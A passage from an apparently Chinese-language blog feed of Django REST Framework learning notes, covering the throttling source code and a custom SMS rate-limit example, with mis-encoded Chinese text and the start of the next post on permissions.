href="#views-APIView-initial" class="headerlink" title="views.APIView.initial()"></a>views.APIView.initial()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initial</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Runs anything that needs to occur prior to calling the method handler.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    self.format_kwarg = self.get_format_suffix(**kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Perform content negotiation and store the accepted info on the request</span></span><br><span class="line">    neg = self.perform_content_negotiation(request)</span><br><span class="line">    request.accepted_renderer, request.accepted_media_type = neg</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Determine the API version, if versioning is in use.</span></span><br><span class="line">    version, scheme = self.determine_version(request, *args, **kwargs)</span><br><span class="line">    request.version, request.versioning_scheme = version, scheme</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ensure that the incoming request is permitted</span></span><br><span class="line">    self.perform_authentication(request)</span><br><span class="line">    self.check_permissions(request)</span><br><span class="line">    self.check_throttles(request)  <span class="comment">#é¢‘ç‡è®¤è¯</span></span><br></pre></td></tr></table></figure><h2 id="views-APIView-check-throttles"><a href="#views-APIView-check-throttles" class="headerlink" title="views.APIView.check_throttles()"></a>views.APIView.check_throttles()</h2><p>é¢‘ç‡ç»„ä»¶æœ€é‡è¦çš„ä¸¤ä¸ªæ–¹æ³•ï¼š<code>allow_request()</code>å’Œ<code>wait()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_throttles</span><span class="params">(self, request)</span>:</span>  <span class="comment">#é¢‘ç‡ç»„ä»¶æ ¸å¿ƒä»£ç </span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Check if request should be throttled.</span></span><br><span class="line"><span class="string">    Raises an appropriate exception if the request is throttled.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    throttle_durations = []</span><br><span class="line">    <span class="keyword">for</span> throttle <span class="keyword">in</span> self.get_throttles():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> throttle.allow_request(request, self):</span><br><span class="line">            throttle_durations.append(throttle.wait())</span><br></pre></td></tr></table></figure><h3 id="views-APIView-get-throttles"><a href="#views-APIView-get-throttles" class="headerlink" title="views.APIView.get_throttles()"></a>views.APIView.get_throttles()</h3><p>å‡ºç°é¢‘ç‡é…ç½®settingsä¿¡æ¯ï¼Œç»è¿‡æŸ¥è¯¢æºç çš„settingsæ–‡ä»¶å¯¹é¢‘ç‡é…ç½®ä¸ºç©º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_throttles</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Instantiates and returns the list of throttles that this view uses.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> [throttle() <span class="keyword">for</span> throttle <span class="keyword">in</span> self.throttle_classes]  <span class="comment">#é¢‘ç‡ç»„ä»¶é…ç½®ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><h3 id="throttling-SimpleRateThrottle"><a href="#throttling-SimpleRateThrottle" class="headerlink" title="throttling.SimpleRateThrottle"></a>throttling.SimpleRateThrottle</h3><details><summary> <b><i>Source Code</i></b> </summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleRateThrottle</span><span class="params">(BaseThrottle)</span>:</span></span><br><span class="line">   </span><br><span class="line">    cache = default_cache</span><br><span class="line">    timer = time.time</span><br><span class="line">    cache_format = <span class="string">'throttle_%(scope)s_%(ident)s'</span></span><br><span class="line">    scope = <span class="literal">None</span></span><br><span class="line">    THROTTLE_RATES = api_settings.DEFAULT_THROTTLE_RATES</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> getattr(self, <span class="string">'rate'</span>, <span class="literal">None</span>):</span><br><span class="line">            self.rate = self.get_rate()  <span class="comment">#3.rateå€¼å°±æ˜¯æ–¹æ³•get_rateçš„è¿”å›å€¼ï¼ˆé¢‘ç‡æ¬¡æ•°ï¼‰</span></span><br><span class="line">        self.num_requests, self.duration = self.parse_rate(self.rate)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_cache_key</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">'.get_cache_key() must be overridden'</span>)</span><br><span class="line"></span><br><span class="line">ã€€ã€€<span class="comment">#get_rateæœ€åè¿”å›çš„ç»“æœæ˜¯è®¾ç½®çš„é¢‘ç‡æ¬¡æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_rate</span><span class="params">(self)</span>:</span><span class="comment">#1.åœ¨è‡ªå®šä¹‰ç±»ä¸­è¦ç»™scopeå±æ€§èµ‹å€¼</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> getattr(self, <span class="string">'scope'</span>, <span class="literal">None</span>):</span><br><span class="line">            msg = (<span class="string">"You must set either `.scope` or `.rate` for '%s' throttle"</span> %</span><br><span class="line">                   self.__class__.__name__)</span><br><span class="line">            <span class="keyword">raise</span> ImproperlyConfigured(msg)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.THROTTLE_RATES[self.scope]  <span class="comment">#2.åœ¨settingsæ–‡ä»¶ä¸­é…ç½®scopeå±æ€§å€¼å¯¹åº”çš„value</span></span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            msg = <span class="string">"No default throttle rate set for '%s' scope"</span> % self.scope</span><br><span class="line">            <span class="keyword">raise</span> ImproperlyConfigured(msg)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_rate</span><span class="params">(self, rate)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> rate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">        num, period = rate.split(<span class="string">'/'</span>)  <span class="comment">#4.rateæœ‰å€¼ï¼Œæ ¹æ®æºç ï¼Œè‡ªå®šä¹‰çš„rateå€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸”æ˜¯è¿™ç§æ ¼å¼ï¼š'æ•°å­—/ä»¥s,m,h,dä¹‹ç±»å¼€å¤´çš„å­—æ¯'</span></span><br><span class="line">        num_requests = int(num)    <span class="comment">#5.è·å¾—çš„æ•°å­—å°±æ˜¯è®¾ç½®çš„é¢‘ç‡æ¬¡æ•°</span></span><br><span class="line">        duration = &#123;<span class="string">'s'</span>: <span class="number">1</span>, <span class="string">'m'</span>: <span class="number">60</span>, <span class="string">'h'</span>: <span class="number">3600</span>, <span class="string">'d'</span>: <span class="number">86400</span>&#125;[period[<span class="number">0</span>]]  <span class="comment">#6.è·å¾—æ˜¯é—´éš”çš„æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰</span></span><br><span class="line">        <span class="keyword">return</span> (num_requests, duration)  <span class="comment">#7.æ•°æ®è¿”å›ç»™__init__ï¼Œè§£å‹èµ‹å€¼</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">allow_request</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.rate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<span class="comment">#get_cache_keyå°±æ˜¯è¦é‡å†™çš„æ–¹æ³•ï¼Œè‹¥ä¸é‡å†™ï¼Œä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">        self.key = self.get_cache_key(request, view)  <span class="comment">#8.è‡ªå®šä¹‰çš„æ—¶å€™éœ€è¦é‡å†™çš„æ–¹æ³•ï¼Œæœ‰è¿”å›å€¼ï¼Œæ”¾å…¥ç¼“å­˜ä¸­</span></span><br><span class="line">        <span class="keyword">if</span> self.key <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        self.history = self.cache.get(self.key, [])  <span class="comment">#9.è·å–ç¼“å­˜ï¼Œé€šè¿‡keyå–å€¼</span></span><br><span class="line">        self.now = self.timer()  <span class="comment">#10.å½“å‰æ—¶é—´</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Drop any requests from the history which have now passed the</span></span><br><span class="line">        <span class="comment"># throttle duration</span></span><br><span class="line">        <span class="keyword">while</span> self.history <span class="keyword">and</span> self.history[<span class="number">-1</span>] &lt;= self.now - self.duration:</span><br><span class="line">            self.history.pop()</span><br><span class="line">        <span class="keyword">if</span> len(self.history) &gt;= self.num_requests:</span><br><span class="line">            <span class="keyword">return</span> self.throttle_failure()</span><br><span class="line">        <span class="keyword">return</span> self.throttle_success()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">throttle_success</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.history.insert(<span class="number">0</span>, self.now)</span><br><span class="line">        self.cache.set(self.key, self.history, self.duration)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">throttle_failure</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€<span class="comment">#è¿”å›è·ä¸‹ä¸€æ¬¡èƒ½è¯·æ±‚çš„æ—¶é—´ï¼Œé™åˆ¶çš„è®¿é—®æ¬¡æ•°åœ¨parse_rateå¯ä»¥æ±‚å‡º</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Returns the recommended next request time in seconds.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> self.history:</span><br><span class="line">            remaining_duration = self.duration - (self.now - self.history[<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            remaining_duration = self.duration</span><br><span class="line"></span><br><span class="line">        available_requests = self.num_requests - len(self.history) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> available_requests &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> remaining_duration / float(available_requests)</span><br></pre></td></tr></table></figure></details><h2 id="å†çœ‹-views-APIView-check-throttles"><a href="#å†çœ‹-views-APIView-check-throttles" class="headerlink" title="å†çœ‹ views.APIView.check_throttles()"></a>å†çœ‹ views.APIView.check_throttles()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_throttles</span><span class="params">(self, request)</span>:</span></span><br><span class="line">    throttle_durations = []</span><br><span class="line">    <span class="comment"># 1ï¼‰éå†é…ç½®çš„é¢‘ç‡è®¤è¯ç±»ï¼Œåˆå§‹åŒ–å¾—åˆ°ä¸€ä¸ªä¸ªé¢‘ç‡è®¤è¯ç±»å¯¹è±¡ï¼ˆä¼šè°ƒç”¨é¢‘ç‡è®¤è¯ç±»çš„ __init__() æ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="comment"># 2ï¼‰é¢‘ç‡è®¤è¯ç±»å¯¹è±¡è°ƒç”¨ allow_request æ–¹æ³•ï¼Œåˆ¤æ–­æ˜¯å¦é™æ¬¡ï¼ˆæ²¡æœ‰é™æ¬¡å¯è®¿é—®ï¼Œé™æ¬¡ä¸å¯è®¿é—®ï¼‰</span></span><br><span class="line">    <span class="comment"># 3ï¼‰é¢‘ç‡è®¤è¯ç±»å¯¹è±¡åœ¨é™æ¬¡åï¼Œè°ƒç”¨ wait æ–¹æ³•ï¼Œè·å–è¿˜éœ€ç­‰å¾…å¤šé•¿æ—¶é—´å¯ä»¥è¿›è¡Œä¸‹ä¸€æ¬¡è®¿é—®</span></span><br><span class="line">    <span class="comment"># æ³¨ï¼šé¢‘ç‡è®¤è¯ç±»éƒ½æ˜¯ç»§æ‰¿ SimpleRateThrottle ç±»</span></span><br><span class="line">    <span class="keyword">for</span> throttle <span class="keyword">in</span> self.get_throttles():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> throttle.allow_request(request, self):</span><br><span class="line">            <span class="comment"># åªè¦é¢‘ç‡é™åˆ¶äº†ï¼Œallow_request è¿”å›Falseäº†ï¼Œæ‰ä¼šè°ƒç”¨wait</span></span><br><span class="line">            throttle_durations.append(throttle.wait())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> throttle_durations:</span><br><span class="line">                <span class="comment"># Filter out `None` values which may happen in case of config / rate</span></span><br><span class="line">                <span class="comment"># changes, see #1438</span></span><br><span class="line">                durations = [</span><br><span class="line">                    duration <span class="keyword">for</span> duration <span class="keyword">in</span> throttle_durations</span><br><span class="line">                    <span class="keyword">if</span> duration <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">                ]</span><br><span class="line"></span><br><span class="line">                duration = max(durations, default=<span class="literal">None</span>)</span><br><span class="line">                self.throttled(request, duration)</span><br></pre></td></tr></table></figure><h1 id="è‡ªå®šä¹‰é¢‘ç‡ç±»"><a href="#è‡ªå®šä¹‰é¢‘ç‡ç±»" class="headerlink" title="è‡ªå®šä¹‰é¢‘ç‡ç±»"></a>è‡ªå®šä¹‰é¢‘ç‡ç±»</h1><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>1) è‡ªå®šä¹‰ä¸€ä¸ªç»§æ‰¿ <code>SimpleRateThrottle</code> ç±» çš„é¢‘ç‡ç±»<br>2) è®¾ç½®ä¸€ä¸ª <code>scope</code> ç±»å±æ€§ï¼Œå±æ€§å€¼ä¸ºä»»æ„è§åçŸ¥æ„çš„å­—ç¬¦ä¸²<br>3) åœ¨settingsé…ç½®æ–‡ä»¶ä¸­ï¼Œé…ç½®drfçš„<code>DEFAULT_THROTTLE_RATES</code>ï¼Œæ ¼å¼ä¸º <code>{scopeå­—ç¬¦ä¸²å€¼: &#39;æ¬¡æ•°/æ—¶é—´&#39;}</code><br>4) åœ¨è‡ªå®šä¹‰é¢‘ç‡ç±»ä¸­é‡å†™ get_cache_key æ–¹æ³•</p><ul><li>é™åˆ¶çš„å¯¹è±¡è¿”å› ä¸é™åˆ¶ä¿¡æ¯æœ‰å…³çš„å­—ç¬¦ä¸²</li><li>ä¸é™åˆ¶çš„å¯¹è±¡è¿”å› <code>None</code> (åªèƒ½æ”¾å›<code>None</code>ï¼Œä¸èƒ½æ˜¯<code>False</code>æˆ–æ˜¯<code>&#39;&#39;</code>ç­‰)</li></ul><h2 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h2><p>å†™ä¸€ä¸ªçŸ­ä¿¡æ¥å£ï¼Œè®¾ç½®<code>1/min</code>é¢‘ç‡é™åˆ¶</p><h3 id="utils-throttles-py"><a href="#utils-throttles-py" class="headerlink" title="utils.throttles.py"></a>utils.throttles.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.throttling <span class="keyword">import</span> SimpleRateThrottle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SMSRateThrottle</span><span class="params">(SimpleRateThrottle)</span>:</span></span><br><span class="line">    scope = <span class="string">'sms'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#åªå¯¹æäº¤æ‰‹æœºå·çš„getæ–¹æ³•è¿›è¡Œé™åˆ¶</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_cache_key</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        mobile = request.query_params.get(<span class="string">'mobile'</span>)</span><br><span class="line">        <span class="comment">#æ²¡æœ‰æ‰‹æœºå·å°±ä¸åšé¢‘ç‡é™åˆ¶</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> mobile:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment">#è¿”å›çš„ä¿¡æ¯å¯ä»¥ç”¨æ‰‹æœºå·åŠ¨æ€å˜åŒ–ï¼Œä¸”ä¸æ˜“é‡å¤çš„å­—ç¬¦ä¸²ï¼Œä½œä¸ºç¼“å­˜çš„key</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'throttle_%(scope)s_%(ident)s'</span> % &#123;<span class="string">'scope'</span>: self.scope, <span class="string">'ident'</span>: mobile&#125;</span><br></pre></td></tr></table></figure><h3 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># drfé…ç½®</span></span><br><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># é¢‘ç‡é™åˆ¶æ¡ä»¶é…ç½®</span></span><br><span class="line">    <span class="string">'DEFAULT_THROTTLE_RATES'</span>: &#123;</span><br><span class="line">        <span class="string">'sms'</span>: <span class="string">'1/min'</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="views-py"><a href="#views-py" class="headerlink" title="views.py"></a>views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .throttles <span class="keyword">import</span> SMSRateThrottle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestSMSAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># å±€éƒ¨é…ç½®é¢‘ç‡è®¤è¯</span></span><br><span class="line">    throttle_classes = [SMSRateThrottle]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'get è·å–éªŒè¯ç  OK'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'post è·å–éªŒè¯ç   OK'</span>)</span><br></pre></td></tr></table></figure><h3 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'sms/'</span>, views.TestSMSAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="Postmanæµ‹è¯•"><a href="#Postmanæµ‹è¯•" class="headerlink" title="Postmanæµ‹è¯•"></a>Postmanæµ‹è¯•</h2><ol><li>åªä¼šå¯¹ <code>/api/sms/?mobile=å…·ä½“æ‰‹æœºå·</code> æ¥å£æ‰ä¼šæœ‰é¢‘ç‡é™åˆ¶ï¼Œè®¾ç½®äº†é™åˆ¶é¢‘ç‡ï¼Œåˆ°è¾¾è®¿é—®æ¬¡æ•°å°±ä¼šç¦æ­¢</li><li>å¯¹ <code>/api/sms/</code> æˆ–å…¶ä»–æ¥å£å‘é€æ— é™åˆ¶</li><li>å¯¹æ•°æ®åŒ…æäº¤<code>mobileçš„/api/sms/</code>æ¥å£æ— é™åˆ¶</li><li>å¯¹ä¸æ˜¯<code>mobile</code>ï¼ˆå¦‚<code>phone</code>ï¼‰å­—æ®µæäº¤çš„ç”µè¯æ¥å£æ— é™åˆ¶</li></ol>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆåäºŒï¼‰ï¼šæƒé™ç»„ä»¶</title>
      <link href="/tech/drf-learning-notes-12-permissions/"/>
      <url>/tech/drf-learning-notes-12-permissions/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (12): Permissions</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç  <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvcGVybWlzc2lvbnMucHk=">rest_framework.permissions<i class="fa fa-external-link-alt"></i></span></li><li>å®˜æ–¹æ–‡æ¡£ <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcGVybWlzc2lvbnMv">API Guild - Permissions<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzEyX2RyZl9wZXJtaXNzaW9uLw==">æœ¬æ–‡demoä»£ç Github<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><h2 id="å…¥å£"><a href="#å…¥å£" class="headerlink" title="å…¥å£"></a>å…¥å£</h2><p>ä»<code>rest_framework.views.APIView</code>çš„<code>dispath(self, request, *args, **kwargs)</code>ä¸‹æ‰‹ï¼Œ<code>dispath</code>æ–¹æ³•å†… <code>self.initial(request, *args, **kwargs)</code> è¿›å…¥ä¸‰å¤§è®¤è¯</p><ul><li>è®¤è¯ç»„ä»¶ <code>self.perform_authentication(request)</code><ul><li>æ ¡éªŒç”¨æˆ·ï¼šæ¸¸å®¢ã€åˆæ³•ç”¨æˆ·ã€éæ³•ç”¨æˆ·</li><li>æ¸¸å®¢ï¼šä»£è¡¨æ ¡éªŒé€šè¿‡ï¼Œç›´æ¥è¿›å…¥ä¸‹ä¸€æ­¥æ ¡éªŒï¼ˆæƒé™æ ¡éªŒï¼‰</li><li>åˆæ³•ç”¨æˆ·ï¼šä»£è¡¨æ ¡éªŒé€šè¿‡ï¼Œå°†ç”¨æˆ·å­˜å‚¨åœ¨<code>request.user</code>ä¸­ï¼Œå†è¿›å…¥ä¸‹ä¸€æ­¥æ ¡éªŒï¼ˆæƒé™æ ¡éªŒï¼‰</li><li>éæ³•ç”¨æˆ·ï¼šä»£è¡¨æ ¡éªŒå¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼Œè¿”å›403æƒé™å¼‚å¸¸ç»“æœ</li></ul></li><li>æƒé™ç»„ä»¶ <code>self.check_permissions(request)</code><ul><li>æ ¡éªŒç”¨æˆ·æƒé™ï¼šå¿…é¡»ç™»å½•ã€æ‰€æœ‰ç”¨æˆ·ã€ç™»å½•ä¹‹åè¯»å†™ï¼Œæ¸¸å®¢åªè¯»ã€è‡ªå®šä¹‰ç”¨æˆ·è§’è‰²</li><li>è®¤è¯é€šè¿‡ï¼šå¯ä»¥è¿›å…¥ä¸‹ä¸€æ­¥æ ¡éªŒï¼ˆé¢‘ç‡è®¤è¯ï¼‰</li><li>è®¤è¯å¤±è´¥ï¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè¿”å›403æƒé™å¼‚å¸¸ç»“æœ</li></ul></li><li>é¢‘ç‡ç»„ä»¶ <code>self.check_throttles(request)</code><ul><li>é™åˆ¶è§†å›¾æ¥å£è¢«è®¿é—®çš„é¢‘ç‡æ¬¡æ•° - é™åˆ¶çš„æ¡ä»¶(IPã€idã€å”¯ä¸€é”®)ã€é¢‘ç‡å‘¨æœŸæ—¶é—´(sã€mã€h)ã€é¢‘ç‡çš„æ¬¡æ•°ï¼ˆ3/sï¼‰</li><li>æ²¡æœ‰è¾¾åˆ°é™æ¬¡ï¼šæ­£å¸¸è®¿é—®æ¥å£</li><li>è¾¾åˆ°é™æ¬¡ï¼šé™åˆ¶æ—¶é—´å†…ä¸èƒ½è®¿é—®ï¼Œé™åˆ¶æ—¶é—´è¾¾åˆ°åï¼Œå¯ä»¥é‡æ–°è®¿é—®</li></ul></li></ul><p>æœ¬æ–‡ä»‹æƒé™ç»„ä»¶ã€‚</p><h2 id="rest-framework-views-APIView-initial"><a href="#rest-framework-views-APIView-initial" class="headerlink" title="rest_framework.views.APIView.initial()"></a>rest_framework.views.APIView.initial()</h2><figure class="highlight python"><table><tr><td 